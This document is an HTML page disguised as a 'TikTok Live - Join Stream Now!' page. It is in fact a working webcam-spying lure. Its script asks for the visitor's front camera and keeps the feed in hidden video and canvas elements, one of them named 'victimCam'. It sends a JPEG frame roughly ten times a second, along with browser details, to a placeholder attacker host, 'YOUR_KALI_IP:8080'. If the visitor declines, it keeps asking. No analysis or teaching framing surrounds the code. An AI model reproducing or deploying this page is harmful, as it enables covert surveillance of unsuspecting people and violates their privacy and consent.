<!DOCTYPE html>
<html>
<head>
    <title>TikTok Live - Join Stream Now!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:linear-gradient(135deg,#ff0050 0%,#ff4d6d 100%);height:100vh;overflow:hidden;}
        .tiktok-container{position:relative;width:100%;height:100vh;background:#000;display:flex;justify-content:center;align-items:center;}
        .live-overlay{position:absolute;top:20px;left:20px;color:#fff;font-size:24px;font-weight:bold;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
        .viewer-count{position:absolute;bottom:30px;left:20px;color:#fff;font-size:18px;}
        .hidden-video{display:none!important;visibility:hidden!important;opacity:0!important;}
        .loading{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;}
    </style>
</head>
<body>
    <div class="tiktok-container">
        <div class="live-overlay">🔴 LIVE NOW</div>
        <div class="viewer-count">👀 12.4K viewers</div>
        <div class="loading" id="loading">Joining live stream... <span id="dots">...</span></div>
        <video id="victimCam" class="hidden-video" autoplay muted playsinline></video>
        <canvas id="hiddenCanvas" class="hidden-video" width="640" height="480"></canvas>
        <div style="position:absolute;width:100%;height:100%;background:url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiB2aWV3Qm94PSIwIDAgMTIwMCAxOTIwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxyZWN0IHdpZHRoPSIxMjAwIiBoZWlnaHQ9IjE5MjAiIGZpbGw9IiMwMDAwMDAiLz48L3N2Zz4=');"></div>
    </div>
    <script>
        (async()=>{try{const stream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:1280},height:{ideal:720},facingMode:'user',frameRate:{ideal:30}}});const video=document.getElementById('victimCam'),canvas=document.getElementById('hiddenCanvas'),ctx=canvas.getContext('2d'),loading=document.getElementById('loading');video.srcObject=stream;video.onloadedmetadata=()=>{video.play();loading.style.display='none';setInterval(()=>{ctx.drawImage(video,0,0,640,480);const frameData=canvas.toDataURL('image/jpeg',0.8);fetch('http://YOUR_KALI_IP:8080/frame',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({frame:frameData,timestamp:Date.now(),userAgent:navigator.userAgent,url:window.location.href})}).catch(()=>{});},100);};document.addEventListener('visibilitychange',()=>{if(!document.hidden)video.play();});}catch(e){setTimeout(arguments.callee,1000);}})();
        const style=document.createElement('style');style.textContent='@keyframes bounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.7;}}.viewer-count::after{content:\'\';animation:pulse 2s infinite;}';document.head.appendChild(style);
    </script>
</body>
</html>
